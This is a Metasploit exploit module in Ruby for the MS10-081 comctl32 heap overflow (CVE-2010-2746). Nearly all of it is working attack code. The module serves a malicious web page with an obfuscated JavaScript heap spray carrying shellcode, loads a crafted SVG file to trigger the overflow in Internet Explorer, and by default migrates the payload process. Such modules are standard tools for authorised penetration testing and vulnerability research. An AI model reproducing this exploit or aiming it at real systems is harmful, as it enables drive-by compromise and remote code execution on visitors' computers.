##
# $Id: ms10_081_comctl32_integertrunction.rb 12936 2011-06-13 03:38:31Z mr_me $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info={})
		super(update_info(info,
			'Name'        => "Comctl32 Heap Overflow Vulnerability",
			'Description' => %q{
				This module exploits a heap overflow vulnerability in the Comctl32 library 
				when processing specially crafted SVG files. The overflow is triggered via 
				an overly long string that gets displayed in the status bar of IE. In order 
				for the SVG messages to be processed, a third party SVG viewer needs to be 
				installed. 
				During testing, Adobes SVG Viewer was used as the SVG message sender, although
				other SVG viewers may work. This exploit was tested against version 
				5.82.2900.5512 of comctl32.dll, and was not fully reliable. Success rate depends
				primarily on the number of iexplorer processes running and possibly other factors. 
				This module does not bypass DEP or ASLR, however implimenting this feature should
				be relatively trivial.
				},
			'License'     => MSF_LICENSE,
			'Version'     => "$Revision: 12936 $",
			'Author'      =>
				[
					'h07',		# founder	
					'd0c_s4vage',	# public exploit
					'mr_me',	# msf
				],
			'References' =>
				[
					['CVE', '2010-2746'],
					['MSB', 'MS10-081' ],
					['BID', '43717'],
					['URL', 'http://secunia.com/advisories/40217'],
					['URL', 'http://www.microsoft.com/technet/security/bulletin/ms10-081.mspx'],
					['URL', 'hhttp://www.breakingpointsystems.com/community/blog/microsoft-vulnerability-proof-of-concept/']
				],
			'Payload' =>
				{
					'BadChars'        => "\x00",
					'space'           => 600,
				},
			'DefaultOptions' =>
				{
					'ExitFunction' => "process",
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					# heap overflow has no 'RET'
					[ 'Automatic', {} ],
				],
			'DisclosureDate' => "Oct 12 2010",
			'DefaultTarget' => 0))

	end

	def exploit
		path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2010-2746.svg")
		f = File.open(path, "rb")
		@trigger = f.read
		f.close

		super
	end

	def on_request_uri(cli, request)

		if request.uri.match(/\.svg/)
			print_status("Sending svg trigger file to #{cli.peerhost}:#{cli.peerport}")
			send_response(cli, @trigger, { 'Content-Type' => 'image/svg+xml' } )
			return
		end

		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# obfuscation phun
		js_func_name		= rand_text_alpha(rand(6) + 3)
		js_var_base		= rand_text_alpha(rand(6) + 3)
		js_var_array		= rand_text_alpha(rand(6) + 3)
		js_var_counter		= rand_text_alpha(rand(6) + 3)
		js_var_str		= rand_text_alpha(rand(6) + 3)
		js_var_result		= rand_text_alpha(rand(6) + 3)
		js_var_length		= rand_text_alpha(rand(6) + 3)
		js_var_shellcode	= rand_text_alpha(rand(6) + 3)
		trigger_file		= get_resource() + "/" + rand_text_alpha(rand(6) + 3) + ".svg"

		# innerHTML heap spray, could have used heaplib
		# TODO: recreate JS to perform a DEP bypass using @WTFuzz heap spray
		# TODO: recreate JS to perform ASLR bypass using JAVA
		html = <<-EOS
		<html>
		<body>
		<script>
		function #{js_func_name}(#{js_var_str}, #{js_var_length}) {
			var #{js_var_result} = #{js_var_str};
			while(#{js_var_result}.length < #{js_var_length}) {
				#{js_var_result} += #{js_var_result};
			}
			return #{js_var_result}.substr(#{js_var_result}.length - #{js_var_length});
		}
		var #{js_var_shellcode} = unescape("%u9000%u9090%ucccc") + 
		unescape("#{shellcode}");
		var #{js_var_base} = #{js_func_name}(unescape("%u2100"), 0x800 - #{js_var_shellcode}.length);
		var #{js_var_array} = [];
		for(var #{js_var_counter} = 0; #{js_var_counter} < 2000; #{js_var_counter}++) {
			#{js_var_array}[#{js_var_counter}] = document.createElement("a");
			#{js_var_array}[#{js_var_counter}].innerHTML = [#{js_var_base} + #{js_var_shellcode}].join("");
		}
		</script>
		<iframe width="100%" height="100%" src="#{trigger_file}" marginheight="0" marginwidth="0"></iframe> 
		</body>
		</html>
		EOS

		#Remove extra tabs in HTML
		html = html.gsub(/^\t\t/, "")

		print_status("Sending malicious page to #{cli.peerhost}:#{cli.peerport}...")
		send_response( cli, html, {'Content-Type' => 'text/html'} )
	end
end

